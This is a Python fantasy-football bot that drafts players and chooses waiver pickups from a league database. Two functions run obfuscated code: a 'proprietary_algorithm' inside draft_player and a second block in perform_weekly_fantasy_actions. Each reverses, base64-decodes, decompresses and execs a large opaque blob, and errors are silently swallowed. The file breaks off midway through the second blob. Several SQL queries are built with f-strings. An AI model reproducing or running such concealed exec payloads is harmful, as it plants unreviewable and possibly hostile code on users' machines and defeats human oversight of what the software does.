from blitz_env.models import DatabaseManager, Player
from blitz_env import Player, AttemptedFantasyActions, WaiverClaim
import collections
import json
import copy
import pandas as pd

# NOTES
#
# Slots: [QB, RB, RB, WR, WR, QB/RB/WR/TE, RB/WR/TE, K, DST, Bench, Bench, Bench]
# PPR: 1
#
#
# add/drop starts in week 3
#

def get_positions_to_fill(db):
    df = pd.read_sql("SELECT * FROM league_settings", db.engine)
    return json.loads(df.iloc[0]["player_slots"])

def get_my_team(db) -> pd.DataFrame:
    """Get current team roster"""
    game_status = db.get_game_status()
    return list(db.session.query(Player).filter(Player.current_bot_id == game_status.current_bot_id))


def draft_player() -> str:
    """
    Selects a player to draft.

    Returns:
        str: The id of the drafted player.
    """

    db = DatabaseManager()
    league_settings = db.get_league_settings()
    game_status = db.get_game_status()
    # stats_db = StatsDB([league_settings.year - 1])

    # zero-based draft round
    current_draft_round = (game_status.current_draft_pick-1) // league_settings.num_teams

    print("-----------------------------------------------------------------")

    def proprietary_algorithm() -> str:
        try:
            _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
        except Exception as e:
            pass
        return ""

    # try the better algorithm first - if it fails, continue on to the basic implementation
    result = proprietary_algorithm()
    if result != "":
        return result

    print(f"round number: {current_draft_round}")
    print()

    # Filter out already drafted players
    # undrafted_players = [player for player in game_state.players if not is_drafted(player)]
    undrafted_players = list(db.session.query(Player).filter(Player.availability == 'AVAILABLE'))
    undrafted_qbs = [player for player in undrafted_players if player.allowed_positions[0] == 'QB']

    # penalize injured players by increasing their rank
    injured_players = set([])
    print(f"injured players: {injured_players}")
    for player in undrafted_players:
        if player.full_name in injured_players:
            print(f"Penalized {player.full_name} for being injured")
            player.rank += 7


    # Get a list of who's on our team already
    my_players = get_my_team(db)
    # my_players = [p for sublist in my_players_by_position for p in sublist]
    print(f"my players: {[p.full_name for p in my_players]}")
    print()

    # Count how many players we're allowed to field for each position
    allowed_position_counts = get_positions_to_fill(db)
    allowed_position_counts['TE'] = 0
    print(f"allowed_position_counts: {allowed_position_counts}")

    # handle bench position. for each bench, add one to each other position
    # note that allowed_position_counts tracks how many of each we can *field* at a time, while position_open_counts tracks how many we can still *draft*
    # position_open_counts = copy.deepcopy(allowed_position_counts)
    position_open_counts = collections.defaultdict(int)
    for pos in allowed_position_counts.keys():
        position_open_counts[pos] = allowed_position_counts[pos]
    # adjust counts
    bench_count = position_open_counts["BENCH"]
    flex_count = position_open_counts["FLEX"]
    superflex_count = position_open_counts["SUPERFLEX"]
    del position_open_counts["BENCH"]
    del position_open_counts["FLEX"]
    del position_open_counts["SUPERFLEX"]
    for pos in ["QB", "RB", "WR", "TE", "K", "DST"]:
        position_open_counts[pos] += bench_count
    for pos in ["RB", "WR", "TE"]:
        position_open_counts[pos] += flex_count
    for pos in ["QB", "RB", "WR", "TE"]:
        position_open_counts[pos] += superflex_count
    

    # count how many players we've already drafted in each position
    filled_position_counts = collections.defaultdict(int)
    for player in my_players:
        # TODO: handle multiple allowed_positions
        pos = player.allowed_positions[0]
        filled_position_counts[pos] += 1

    # subtract filled_position_counts from position_open_counts
    for pos in position_open_counts.keys():
        position_open_counts[pos] -= filled_position_counts[pos]

    print("Open position counts:")
    for pos, count in position_open_counts.items():
        print(f"{pos}: {count}")
    print()

    print("Filled position counts:")
    for pos, count in filled_position_counts.items():
        print(f"{pos}: {count}")
    print()

    open_positions = set()
    for pos, count in position_open_counts.items():
      if count > 0:
        open_positions.add(pos)
    print(f"Open positions: {open_positions}")

    # TODO: this logic is really only sound for positions that have one slot (i.e. "we can have one QB"). It doesn't really work for things like "we can have 3 RBs"
    unfilled_positions = set()
    for pos, count in filled_position_counts.items():
        if count == 0:
            unfilled_positions.add(pos)
    print(f"positions that are completely unfilled: {unfilled_positions}")
    print()

    # Select the player with the highest rank (lowest rank number)
    # TODO: handle multiple allowed_positions
    if undrafted_players:
        allowed_players = [player for player in undrafted_players if player.allowed_positions[0] in open_positions]

        if len(allowed_players) == 0:
            print("no allowed players found - drafting the best-ranked undrafted player regardless of position")
            if len(undrafted_players) > 0:
                p = min(undrafted_players, key=lambda p: p.rank)
                print(f"drafting {p.full_name} : {p.allowed_positions}")
                return p.id
            else:
                return ""

        rank_ordered = sorted(allowed_players, key=lambda p: p.rank)
        
        # if we're getting to the end of the draft, make sure we have a player for each position/slot
        # TODO: double-check for off-by-1 error here
        if league_settings.total_rounds - current_draft_round - 1 - len(unfilled_positions) <= 0:
            for player in rank_ordered:
                if player.allowed_positions[0] in unfilled_positions:
                    print("nearing end of draft, drafting player to fill an unfilled position")
                    print(f"drafting {player.full_name} : {player.allowed_positions}")
                    return player.id

        # only draft allowed count + 1 maximum for each position, don't do more.
        for player in rank_ordered:
            pos = player.allowed_positions[0]
            allowed_count = allowed_position_counts[pos]
            extras = filled_position_counts[pos] - allowed_position_counts[pos]
            if extras >= 1:
                # print(f"  skipping a {pos} because we already have {filled_position_counts[pos]}, which is {extras} extra")
                # skip because we already have enough of @pos
                continue
            print("drafting the best-ranked player, while skipping positions that we already have a lot of")
            print(f"drafting {player.full_name} : {player.allowed_positions}")
            return player.id

        print("drafting the best-ranked player in allowed_players")
        player = rank_ordered[0].id
        print(f"drafting {player.full_name} : {player.allowed_positions}")
        return player
    else:
        return ""  # Return empty string if no undrafted players are available


def get_current_fantasy_week(db):
    df = pd.read_sql("SELECT * FROM game_statuses", db.engine)
    return df.iloc[0]["current_fantasy_week"]

def get_current_bot_id(db):
    df = pd.read_sql("SELECT * FROM game_statuses", db.engine)
    return df.iloc[0]["current_bot_id"]

def get_my_remaining_budget(db, current_bot_id):
    queryStr = f"SELECT * FROM bots where id = '{current_bot_id}'"
    df = pd.read_sql(queryStr, db.engine) 
    return df.iloc[0]["remaining_waiver_budget"]

def get_current_opponent_id(db, current_bot_id, week):
    queryStr = f"SELECT * FROM matchups where week = {week} AND (home_bot_id = '{current_bot_id}' OR visitor_bot_id = '{current_bot_id}')"
    df = pd.read_sql(queryStr, db.engine)
    matchup = df.iloc[0]

    if matchup["home_bot_id"] == current_bot_id:
        return matchup["visitor_bot_id"]
    elif matchup["visitor_bot_id"] == current_bot_id:
        return matchup["home_bot_id"]
    else:
        return "Unknown"

def get_season_stats_for_available_players(db):
    queryStr = """
        SELECT *
        FROM players AS p
        INNER JOIN weekly_stats AS w
            ON p.id = w.fantasypros_id
        WHERE p.current_bot_id IS NULL
        ORDER BY FPTS desc
    """
    return pd.read_sql(queryStr, db.engine)

global actions
def set_global_actions(act):
    global actions
    actions = act

def perform_weekly_fantasy_actions() -> AttemptedFantasyActions:
    db = DatabaseManager()
    current_fantasy_week = get_current_fantasy_week(db)
    current_bot_id = get_current_bot_id(db)
    current_budget = get_my_remaining_budget(db, current_bot_id)
    data_on_available_players = get_season_stats_for_available_players(db)
    my_team = get_my_team(db)

    print("my team:")
    print(my_team)
    print()

    wanted_players = []
    for index, row in data_on_available_players.iterrows():
        print(index, row["week"], row["full_name"], row["allowed_positions"], row["FPTS"])
        wanted_players.append(row["id"])
        if len(wanted_players) > 2:
            break

    print("wanted_players:")
    print(wanted_players)
    
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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